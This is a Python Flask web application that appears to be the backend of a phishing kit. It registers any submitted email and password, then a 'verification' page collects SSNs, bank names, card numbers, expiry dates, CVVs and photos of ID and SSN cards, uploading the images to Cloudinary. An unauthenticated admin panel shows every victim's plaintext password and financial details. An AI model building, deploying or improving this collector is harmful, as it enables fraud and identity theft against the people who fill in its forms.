from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from flask_sqlalchemy import SQLAlchemy
import os
import cloudinary
import cloudinary.uploader
import cloudinary.api
from dotenv import load_dotenv
import logging # For better logging
import urllib.parse # Added for explicit Cloudinary configuration

# Load environment variables from .env file (especially for local development)
load_dotenv()

# ---- START TEMPORARY DEBUG PRINTS ----
#print(f"--- ENV DEBUG START ---")
#print(f"DATABASE_URL from os.environ: {os.environ.get('DATABASE_URL')}")
#print(f"CLOUDINARY_URL from os.environ: {os.environ.get('CLOUDINARY_URL')}")
#print(f"SECRET_KEY from os.environ: {os.environ.get('SECRET_KEY')}")
#print(f"FLASK_DEBUG from os.environ: {os.environ.get('FLASK_DEBUG')}")
#print(f"--- ENV DEBUG END ---")
# ---- END TEMPORARY DEBUG PRINTS ----

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# --- Configurations ---
# Secret key for session management
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(24)) # Use environment variable or fallback

# Cloudinary Configuration (More Explicit)
cloudinary_url_str = os.environ.get('CLOUDINARY_URL')
if cloudinary_url_str:
    try:
        parsed_url = urllib.parse.urlparse(cloudinary_url_str)
        cloudinary.config(
            cloud_name = parsed_url.hostname,
            api_key = parsed_url.username,
            api_secret = parsed_url.password,
            secure = True
        )
        if cloudinary.config().cloud_name:
            logger.info(f"Cloudinary explicitly configured with cloud name: {cloudinary.config().cloud_name}")
        else:
            logger.warning("Cloudinary cloud_name is None even after explicit config. Check CLOUDINARY_URL components in .env")
    except Exception as e:
        logger.error(f"Error parsing CLOUDINARY_URL or configuring Cloudinary explicitly: {e}")
else:
    logger.warning("CLOUDINARY_URL not found in environment. Cloudinary not configured.")


# Database Configuration (PostgreSQL)
# Reads DATABASE_URL from environment variables
db_url = os.environ.get('DATABASE_URL')
if db_url:
    if db_url.startswith("postgres://"): # Heroku/Render often use postgres://
        db_url = db_url.replace("postgres://", "postgresql://", 1)
    app.config['SQLALCHEMY_DATABASE_URI'] = db_url
    logger.info(f"Database URL set to: {db_url[:30]}...") # Log partial URL for confirmation, avoid full logging
else:
    logger.error("DATABASE_URL environment variable not set or is empty. Database will not connect.")
    app.config['SQLALCHEMY_DATABASE_URI'] = None # Explicitly set to None if not found

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False # Suppress a warning
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {"pool_pre_ping": True} # Helps with connection pooling


db = SQLAlchemy(app)

# --- Database Model Definition ---
class User(db.Model):
    __tablename__ = 'users' # Explicitly name the table
    id = db.Column(db.Integer, primary_key=True) # Auto-incrementing primary key
    email = db.Column(db.String(120), unique=True, nullable=False, index=True)
    # IMPORTANT: In a real app, passwords MUST be hashed!
    password = db.Column(db.String(120), nullable=False) 
    
    fullname = db.Column(db.String(120), nullable=True)
    phonenumber = db.Column(db.String(30), nullable=True)
    
    ssn = db.Column(db.String(11), nullable=True) 
    bankName = db.Column(db.String(100), nullable=True)
    cardNumber = db.Column(db.String(25), nullable=True) 
    expiryDate = db.Column(db.String(7), nullable=True) 
    cvv = db.Column(db.String(4), nullable=True) 

    photoIdFront_url = db.Column(db.String(255), nullable=True)
    photoIdBack_url = db.Column(db.String(255), nullable=True)
    ssnCard_url = db.Column(db.String(255), nullable=True)

    def __repr__(self):
        return f'<User {self.email}>'

# --- Create Database Tables ---
if app.config['SQLALCHEMY_DATABASE_URI']: 
    with app.app_context():
        try:
            db.create_all()
            logger.info("Database tables checked/created successfully.")
        except Exception as e:
            logger.error(f"Error creating database tables: {e}")
            logger.error("Please ensure your DATABASE_URL is correct and the database server is running and accessible.")
else:
    logger.warning("SQLALCHEMY_DATABASE_URI is not set. Skipping db.create_all().")


# --- Helper function for image upload to Cloudinary ---
def upload_to_cloudinary(base64_data, public_id_prefix="user_document"):
    if not base64_data:
        logger.info("No base64_data provided to upload_to_cloudinary.")
        return None
    
    if not cloudinary.config().api_key: 
        logger.error("Cloudinary is not configured (API key missing). Cannot upload image.")
        return None
        
    try:
        data_uri = f"data:image/png;base64,{base64_data}"
        logger.info(f"Attempting to upload image to Cloudinary (prefix: {public_id_prefix})...")
        upload_result = cloudinary.uploader.upload(
            data_uri,
            folder="user_verifications", 
            overwrite=True,
            resource_type="image"
        )
        secure_url = upload_result.get('secure_url')
        if secure_url:
            logger.info(f"Image uploaded to Cloudinary successfully: {secure_url}")
        else:
            logger.warning(f"Cloudinary upload result did not contain a secure_url. Result: {upload_result}")
        return secure_url
    except Exception as e:
        logger.error(f"Cloudinary upload failed: {e}")
        return None

# --- ROUTES ---

@app.route('/')
def index():
    if session.get('logged_in'):
        user_email = session.get('user_email')
        if user_email and app.config['SQLALCHEMY_DATABASE_URI']:
            try:
                user = User.query.filter_by(email=user_email).first()
                if user and not user.ssn: 
                    return redirect(url_for('verification_page'))
            except Exception as e:
                logger.error(f"Database error in index route for user {user_email}: {e}")
        return redirect(url_for('dashboard'))
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    if not app.config['SQLALCHEMY_DATABASE_URI']: # Ensure DB is configured
        logger.error("Login attempt while database is not configured.")
        return jsonify({'message': 'System error: Login service unavailable.'}), 503

    data = request.get_json()
    if not data:
        return jsonify({'message': 'Invalid request data.'}), 400
        
    email = data.get('email')
    password = data.get('password')

    if not email or not password:
        return jsonify({'message': 'Email and password are required.'}), 400

    try:
        user = User.query.filter_by(email=email).first()

        if not user:  # User does not exist, so create them
            logger.info(f"New user registration attempt for {email}.")
            # IMPORTANT: In a real production app, you MUST HASH this password before saving!
            # For example, using: from werkzeug.security import generate_password_hash
            # hashed_password = generate_password_hash(password)
            new_user = User(
                email=email,
                password=password,  # Storing plain text - HASH IN PRODUCTION!
                fullname="",
                phonenumber="",
                ssn="",
                bankName="",
                cardNumber="",
                expiryDate="",
                cvv="",
                photoIdFront_url="",
                photoIdBack_url="",
                ssnCard_url=""
            )
            db.session.add(new_user)
            db.session.commit()
            logger.info(f"New user {email} created successfully.")
            user = new_user  # The newly created user is now our current user for login

        # Now, 'user' is either the existing user or the newly created one.
        # IMPORTANT: If the user was just created, the password check is implicitly true.
        # For existing users, we check the password.
        # Again, in production, compare hashed passwords: check_password_hash(user.password, password)
        if user and user.password == password:
            session['logged_in'] = True
            session['user_email'] = user.email
            session['user_id'] = user.id
            logger.info(f"User {email} logged in successfully (new or existing).")

            # All users (newly created or existing but unverified) should proceed to verification if SSN is missing
            if not user.ssn:
                return jsonify({'message': 'Login successful, please complete verification.'}), 200
            return jsonify({'message': 'Login successful.'}), 200
        else:
            logger.warning(f"Failed login attempt for {email} (password mismatch or issue post-creation).")
            return jsonify({'message': 'Invalid email or password.'}), 401

    except Exception as e:
        db.session.rollback() 
        logger.error(f"Database error during login/registration for {email}: {e}")
        return jsonify({'message': 'An error occurred during login. Please try again.'}), 500


@app.route('/verification')
def verification_page():
    if not session.get('logged_in'):
        logger.info("Unauthorized access to /verification, redirecting to login.")
        return redirect(url_for('index'))
    return render_template('verification.html')

@app.route('/verify_info', methods=['POST'])
def verify_info():
    if not session.get('logged_in'):
        return jsonify({'message': 'Unauthorized Access: Please log in.'}), 401
    
    if not app.config['SQLALCHEMY_DATABASE_URI']:
        return jsonify({'message': 'Database not configured. Cannot save verification info.'}), 503
    if not cloudinary.config().api_key: 
         return jsonify({'message': 'Image service not configured. Cannot process image uploads.'}), 503

    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'message': 'User session invalid.'}), 400

    try:
        user = User.query.get(user_id)
        if not user:
            return jsonify({'message': 'User not found.'}), 404

        data = request.get_json()
        if not data:
            return jsonify({'message': 'No data provided'}), 400
        
        logger.info(f"Received verification data for user {user.email}: {list(data.keys())}")

        user.fullname = data.get('fullName', user.fullname)
        user.phonenumber = data.get('phoneNumber', user.phonenumber)
        user.ssn = data.get('ssn', user.ssn)
        user.bankName = data.get('bankName', user.bankName)
        user.cardNumber = data.get('cardNumber', user.cardNumber)
        user.expiryDate = data.get('expiryDate', user.expiryDate)
        user.cvv = data.get('cvv', user.cvv) 

        photo_id_front_base64 = data.get('photoIdFront')
        photo_id_back_base64 = data.get('photoIdBack')
        ssn_card_base64 = data.get('ssnCard')

        if photo_id_front_base64:
            user.photoIdFront_url = upload_to_cloudinary(photo_id_front_base64, f"{user.email}_id_front")
        if photo_id_back_base64:
            user.photoIdBack_url = upload_to_cloudinary(photo_id_back_base64, f"{user.email}_id_back")
        if ssn_card_base64:
            user.ssnCard_url = upload_to_cloudinary(ssn_card_base64, f"{user.email}_ssn_card")
        
        db.session.commit()
        logger.info(f"Verification info for user {user.email} updated successfully in DB.")
        session['user_fullname'] = user.fullname 
        return jsonify({'message': 'Verification information updated successfully!'}), 200
    except Exception as e:
        db.session.rollback()
        logger.error(f"Error processing/saving verification info for {user.email}: {e}")
        return jsonify({'message': 'Error saving information. Please try again.'}), 500

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('index'))
    return render_template('dashboard.html')

@app.route('/admin_panel')
def admin_panel():
    if not app.config['SQLALCHEMY_DATABASE_URI']:
        return "Database not configured. Admin panel unavailable.", 503
        
    try:
        all_users = User.query.all()
        users_data_for_template = {}
        for user_obj in all_users:
            users_data_for_template[user_obj.email] = {
                'password': user_obj.password, 
                'fullname': user_obj.fullname,
                'fullName': user_obj.fullname, 
                'phonenumber': user_obj.phonenumber,
                'phoneNumber': user_obj.phonenumber, 
                'ssn': user_obj.ssn,
                'bankName': user_obj.bankName,
                'cardNumber': user_obj.cardNumber,
                'expiryDate': user_obj.expiryDate,
                'cvv': user_obj.cvv,
                'photoIdFront': user_obj.photoIdFront_url, 
                'photoIdBack': user_obj.photoIdBack_url,   
                'ssnCard': user_obj.ssnCard_url,           
            }
        logger.info(f"Serving admin panel with {len(all_users)} users.")
        return render_template('admin.html', users=users_data_for_template) 
    except Exception as e:
        logger.error(f"Database error in admin_panel: {e}")
        return "Error retrieving user data for admin panel.", 500

@app.route('/logout', methods=['POST'])
def logout():
    user_email = session.get('user_email', 'Unknown user')
    session.clear()
    logger.info(f"User {user_email} logged out.")
    return jsonify({'message': 'Logged out successfully'}), 200

if __name__ == '__main__':
    if not os.path.exists('templates'):
        os.makedirs('templates')
        logger.info("Created templates directory.")

    if app.config['SQLALCHEMY_DATABASE_URI']: 
        with app.app_context():
            if not User.query.first(): 
                logger.info("No users found in DB, creating a test user.")
                test_user = User(email='test@example.com', password='password123', fullname='Test User')
                db.session.add(test_user)
                db.session.commit()
                logger.info("Test user created.")
    else:
        logger.warning("Database not configured. Test user not created. Application might not function correctly.")

    # Changed default port to 5001 to help avoid "Port 5000 is in use"
    port = int(os.environ.get("PORT", 5001)) 
    
    app.run(host='0.0.0.0', port=port, debug=os.environ.get('FLASK_DEBUG', 'True').lower() == 'true')
